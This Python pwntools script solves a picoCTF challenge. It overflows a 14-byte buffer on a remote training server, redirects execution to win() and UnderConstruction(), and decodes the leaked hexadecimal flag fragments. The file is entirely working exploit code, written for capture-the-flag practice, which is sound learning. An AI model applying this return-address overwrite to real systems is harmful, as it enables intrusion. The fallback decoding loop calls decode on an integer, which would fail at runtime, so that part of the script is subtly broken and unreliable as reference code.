from pwn import *
 
context.arch = 'i386'
 
# create ELF object of the challenge's files we want to exploit
elf = ELF("./vuln")
 
 
# offset before hitting the return address
overflow_offset = 14
overflow = b'A' * overflow_offset
 
# connect to server
# r = remote('saturn.picoctf.net', 63383)
r = remote('saturn.picoctf.net', 52054)
#r = process("./vuln")
 
# craft full payload (including win()'s address)
log.info("win()'s address: " + str(hex(elf.symbols['win'])))
log.info("UnderConstruction()'s address: " + str(hex(elf.symbols['UnderConstruction'])))
payload = overflow + p32(elf.symbols['win']) + p32(elf.symbols['UnderConstruction'])
 
# send exploit once prompted
r.sendlineafter("Give me a string that gets you the flag\n", payload)
 
# ignore puts(buf) that echos our input
r.recvuntil('\n')
# get last part of the flag from "User information : ..."
flag3 = r.recvuntil('\n')
# get 2nd part of the flag from "Names of user: ..."
flag2 = r.recvuntil('\n')
# get 1st part of the flag from "Age of user: ..."
flag1 = r.recv()
 
log.info("Preprocessed output of the flag: \n" + str(flag3 + flag2 + flag1))
 
# process the flag since they are all in hexadecimals and have additional strings we don't need like
flag3 = flag3.decode('utf-8').split(' : ')
flag3 = flag3[1].strip().split()
flag3 = flag3[::-1] # reverse the list of hexadecimals
 
flag2 = flag2.decode('utf-8').split(': ')
flag2 = flag2[1].strip().split()
flag2 = flag2[::-1] # reverse the list of hexadecimals
 
flag1 = flag1.decode('utf-8').split(': ')
flag1 = flag1[1].strip()    # flag in "Age of user: ..." only has one hexadecimal hence we don't need to split and reverse it
 
 
# join the lists
flaglist = list()
flaglist.append(flag1)
flaglist.extend(flag2)
flaglist.extend(flag3)
 
# convert all string hexadecimals to characters (change back to little-endian by using p32())
flag = ""
for hexdec in flaglist:
    try:
        # convert hexadecimal values to chars
        flag += p32(int(hexdec, base=0)).decode("utf-8")
    except UnicodeDecodeError:
        # removes "0x" from this hexadecimal
        hexdec = hexdec[2:]
         
        # since %p prints out hexadecimal means the 4 characters are in reverse order, we need to reverse retrieve their bytes
        for single_hexdec1, single_hexdec2 in zip(hexdec[-2::-2], hexdec[-1::-2]):
            single_hexdec = single_hexdec1 + single_hexdec2
            # convert single hexadecimal value to integer
            ascii_val = int(single_hexdec, base=16)
             
            # add printable readable characters
            if 32 < ascii_val and ascii_val < 127:
                flag += ascii_val.decode("utf-8")
                 
                # found '}' which means it is the end of the flag
                if ascii_val == 125:
                    break
            else:
                # start of non-possible flag value. 
                break
        break
         
log.info(flag)
 
r.close()